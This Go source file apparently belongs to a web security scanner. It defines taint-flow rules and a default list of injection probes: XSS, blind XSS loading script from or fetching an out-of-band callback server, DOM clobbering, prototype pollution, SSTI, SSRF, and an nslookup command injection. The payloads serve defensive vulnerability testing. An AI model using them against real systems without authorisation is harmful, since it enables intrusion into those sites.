// Filename: probes.go
package taint

import (
	"github.com/xkilldash9x/scalpel-cli/api/schemas"
	// Import core definitions (Step 1)
	"github.com/xkilldash9x/scalpel-cli/internal/analysis/core"
)

// TaintFlowPath represents a logical path from a probe (representing a taint
// source) to a sink. This is used to define a ruleset for valid and invalid
// flows to reduce false positives.
type TaintFlowPath struct {
	ProbeType schemas.ProbeType
	SinkType  schemas.TaintSink
}

// ValidTaintFlows is a map that acts as a rules engine, defining the set of
// logical and high-risk taint flows. For example, it validates that an XSS
// probe reaching an `innerHTML` sink is a valid path to report, while a generic
// probe reaching the same sink might be ignored.
var ValidTaintFlows = map[TaintFlowPath]bool{
	{schemas.ProbeTypeXSS, schemas.SinkEval}:                true,
	{schemas.ProbeTypeXSS, schemas.SinkInnerHTML}:           true,
	{schemas.ProbeTypeXSS, schemas.SinkOuterHTML}:           true,
	{schemas.ProbeTypeXSS, schemas.SinkDocumentWrite}:       true,
	{schemas.ProbeTypeXSS, schemas.SinkIframeSrcDoc}:        true,
	{schemas.ProbeTypeXSS, schemas.SinkFunctionConstructor}: true,
	{schemas.ProbeTypeXSS, schemas.SinkScriptSrc}:           true,
	{schemas.ProbeTypeXSS, schemas.SinkIframeSrc}:           true,
	{schemas.ProbeTypeXSS, schemas.SinkNavigation}:          true,
	{schemas.ProbeTypeXSS, schemas.SinkPostMessage}:         true,
	{schemas.ProbeTypeXSS, schemas.SinkWorkerPostMessage}:   true,

	{schemas.ProbeTypeDOMClobbering, schemas.SinkEval}:       true,
	{schemas.ProbeTypeDOMClobbering, schemas.SinkInnerHTML}:  true,
	{schemas.ProbeTypeDOMClobbering, schemas.SinkNavigation}: true,

	{schemas.ProbeTypeSSTI, schemas.SinkEval}:                true,
	{schemas.ProbeTypeSSTI, schemas.SinkInnerHTML}:           true,
	{schemas.ProbeTypeSSTI, schemas.SinkOuterHTML}:           true,
	{schemas.ProbeTypeSSTI, schemas.SinkDocumentWrite}:       true,
	{schemas.ProbeTypeSSTI, schemas.SinkIframeSrcDoc}:        true,
	{schemas.ProbeTypeSSTI, schemas.SinkFunctionConstructor}: true,

	{schemas.ProbeTypeSQLi, schemas.SinkInnerHTML}:         true,
	{schemas.ProbeTypeCmdInjection, schemas.SinkInnerHTML}: true,

	{schemas.ProbeTypeGeneric, schemas.SinkWebSocketSend}:     true,
	{schemas.ProbeTypeGeneric, schemas.SinkXMLHTTPRequest}:    true,
	{schemas.ProbeTypeGeneric, schemas.SinkXMLHTTPRequestURL}: true,
	{schemas.ProbeTypeGeneric, schemas.SinkFetch}:             true,
	{schemas.ProbeTypeGeneric, schemas.SinkFetchURL}:          true,
	{schemas.ProbeTypeGeneric, schemas.SinkNavigation}:        true,
	{schemas.ProbeTypeGeneric, schemas.SinkSendBeacon}:        true,
	{schemas.ProbeTypeGeneric, schemas.SinkWorkerSrc}:         true,

	{schemas.ProbeTypeOAST, schemas.SinkWebSocketSend}:     true,
	{schemas.ProbeTypeOAST, schemas.SinkXMLHTTPRequest}:    true,
	{schemas.ProbeTypeOAST, schemas.SinkXMLHTTPRequestURL}: true,
	{schemas.ProbeTypeOAST, schemas.SinkFetch}:             true,
	{schemas.ProbeTypeOAST, schemas.SinkFetchURL}:          true,
	{schemas.ProbeTypeOAST, schemas.SinkNavigation}:        true,
	{schemas.ProbeTypeOAST, schemas.SinkSendBeacon}:        true,
	{schemas.ProbeTypeOAST, schemas.SinkWorkerSrc}:         true,
}

// DefaultProbes provides a default, comprehensive list of attack payloads
// (probes) for various vulnerability classes, including XSS, SSTI, Prototype
// Pollution, and OAST-based checks. This list serves as the default configuration
// for the taint analyzer.
func DefaultProbes() []ProbeDefinition {
	// VULN-FIX: Use a template placeholder for the callback name in the execution proof.
	// This will be replaced by the session-specific randomized name in the analyzer.
	// The XSS payload must call the function on the window object (or 'self' in workers).
	executionProofCall := `self.{{.ProofCallbackName}}('{{.Canary}}')`

	// OAST Integration: Define the OAST callback formats.
	// {{.OASTServer}} is replaced by the Analyzer if an OAST provider is configured.
	oastFetch := `fetch('http://{{.OASTServer}}/{{.Canary}}')`
	oastImage := `new Image().src='//{{.OASTServer}}/i/{{.Canary}}'`

	return []ProbeDefinition{
		// -- XSS Probes: Execution-Based (High Confidence) --

		// HTML Injection Context
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<img src=x onerror=` + executionProofCall + `>`,
			Description: "Classic XSS via image onerror event.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<svg/onload=` + executionProofCall + `>`,
			Description: "XSS via SVG onload event.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "HTML_INJECTION",
			Payload:     `<video><source onerror=` + executionProofCall + `></video>`,
			Description: "XSS via video source onerror event (HTML5).",
		},

		// Attribute Injection Context
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `" autofocus onfocus=` + executionProofCall,
			Description: "XSS by breaking out of a double-quoted attribute and using event handlers.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `' autofocus onfocus=` + executionProofCall,
			Description: "XSS by breaking out of a single-quoted attribute.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "ATTRIBUTE_INJECTION",
			Payload:     `" style="animation-name:x" onanimationstart=` + executionProofCall,
			Description: "XSS via CSS animation event handler.",
		},

		// URI Context (e.g., <a href="...">)
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "URI_INJECTION",
			Payload:     `javascript:` + executionProofCall,
			Description: "XSS via javascript: protocol handler in URI attribute.",
		},

		// JavaScript Injection Context (inside <script> tags)
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "JS_INJECTION",
			Payload:     `';` + executionProofCall + `;//`,
			Description: "XSS by terminating a JS statement (single quote) and executing arbitrary code.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "JS_INJECTION",
			Payload:     `</script><script>` + executionProofCall + `</script>`,
			Description: "XSS by closing the current script tag and opening a new one.",
		},
		{
			Type:    schemas.ProbeTypeXSS,
			Context: "JS_INJECTION",
			// Template literal injection (ES6)
			Payload:     "${" + executionProofCall + "}",
			Description: "XSS within JS template literals (backticks).",
		},

		// -- XSS Probes: OAST-Based (Blind XSS) --
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "BLIND_HTML_INJECTION",
			Payload:     `<script src="//{{.OASTServer}}/s/{{.Canary}}"></script>`,
			Description: "Blind XSS via external script loading.",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "BLIND_JS_INJECTION",
			Payload:     `';` + oastFetch + `;//`,
			Description: "Blind XSS via JS fetch callback (JS context).",
		},
		{
			Type:        schemas.ProbeTypeXSS,
			Context:     "BLIND_HTML_INJECTION",
			Payload:     `<img src=x onerror="` + oastImage + `">`,
			Description: "Blind XSS via image onerror (HTML context).",
		},

		// -- DOM Clobbering/Interference --
		{
			Type:    schemas.ProbeTypeDOMClobbering,
			Context: "HTML_INJECTION",
			// Attempts to clobber 'window.someVar.enabled' and trigger execution if logic relies on it.
			Payload:     `<a id=someVar><a id=someVar name=enabled href="javascript:` + executionProofCall + `">ClickMe</a>`,
			Description: "DOM Clobbering (A/A) leading to potential logic bypass or XSS.",
		},
		{
			Type:    schemas.ProbeTypeDOMClobbering,
			Context: "HTML_INJECTION",
			// Attempts to clobber 'window.settings.isAdmin' to true. (Does not execute JS, aims to disrupt logic).
			Payload:     `<form id=settings><input name=isAdmin value=true></form>`,
			Description: "DOM Clobbering (Form/Input) targeting configuration objects.",
		},

		// -- JavaScript Prototype Pollution --
		{
			Type:    schemas.ProbeTypePrototypePollution,
			Context: "JSON_PARSE_MERGE",
			// Pollutes Object.prototype with 'scalpelPolluted' set to the canary.
			// The JS shim detects this pollution.
			Payload:     `{"__proto__":{"scalpelPolluted":"{{.Canary}}"}}`,
			Description: "Prototype Pollution via __proto__ injection (Common).",
		},
		{
			Type:    schemas.ProbeTypePrototypePollution,
			Context: "QS_PARSE_MERGE",
			// Pollution via query string format (common in URL params/hash).
			Payload:     `__proto__[scalpelPolluted]={{.Canary}}`,
			Description: "Prototype Pollution via __proto__ injection (Query String format).",
		},
		{
			Type:    schemas.ProbeTypePrototypePollution,
			Context: "MERGE_CLONE",
			// Pollution via constructor.prototype (sometimes bypasses filters).
			Payload:     `{"constructor":{"prototype":{"scalpelPolluted":"{{.Canary}}"}}}`,
			Description: "Prototype Pollution via constructor.prototype injection.",
		},

		// -- SSTI (Server-Side Template Injection) --
		// These rely on the server evaluating the template and reflecting the XSS payload.
		{
			Type:        schemas.ProbeTypeSSTI,
			Context:     "TEMPLATE_EVAL_XSS",
			Payload:     `${7 * 7}<img src=x onerror=` + executionProofCall + `>`,
			Description: "SSTI leading to XSS (JSP/EL/Velocity/Spring).",
		},
		{
			Type:        schemas.ProbeTypeSSTI,
			Context:     "TEMPLATE_EVAL_XSS",
			Payload:     `{{7*7}}<img src=x onerror=` + executionProofCall + `>`,
			Description: "SSTI leading to XSS (Twig/Jinja2/Handlebars/AngularJS).",
		},

		// -- OAST (SSRF, Blind RCE, etc.) --
		// These probes test if user input influences server-side requests or commands.
		{
			Type:        schemas.ProbeTypeOAST,
			Context:     "SSRF_HTTP",
			Payload:     `http://{{.OASTServer}}/ssrf/{{.Canary}}`,
			Description: "SSRF via HTTP URL injection.",
		},
		{
			Type:    schemas.ProbeTypeOAST,
			Context: "BLIND_RCE_DNS",
			// Attempts to execute nslookup/ping to trigger a DNS interaction.
			Payload:     `; nslookup {{.Canary}}.{{.OASTServer}} #`,
			Description: "Blind RCE (Linux) via command injection triggering DNS interaction.",
		},

		// -- SQLi & Command Injection (Reflected as XSS) --
		// These test if backend injections result in reflected XSS.
		{
			Type:        schemas.ProbeTypeSQLi,
			Context:     "REFLECTED_XSS",
			Payload:     `' OR '1'='1 <script>` + executionProofCall + `</script>`,
			Description: "Reflected SQLi leading to XSS.",
		},
		{
			Type:        schemas.ProbeTypeCmdInjection,
			Context:     "REFLECTED_XSS",
			Payload:     `; echo '<script>` + executionProofCall + `</script>' #`,
			Description: "Reflected Command Injection leading to XSS.",
		},

		// -- Generic Data Flow Tracking --
		{
			Type:        schemas.ProbeTypeGeneric,
			Context:     "UNKNOWN",
			Payload:     `GENERIC_{{.Canary}}`,
			Description: "Generic canary tracking for data flow analysis (leakage/exfiltration).",
		},
	}
}

// DefaultSinks provides a default list of JavaScript sinks to be instrumented by the taint analysis shim.
// (Step 1: Delegate to the unified core list)
func DefaultSinks() []SinkDefinition {
	// SinkDefinition is aliased to core.SinkDefinition in types.go
	return core.DefaultSinks()
}
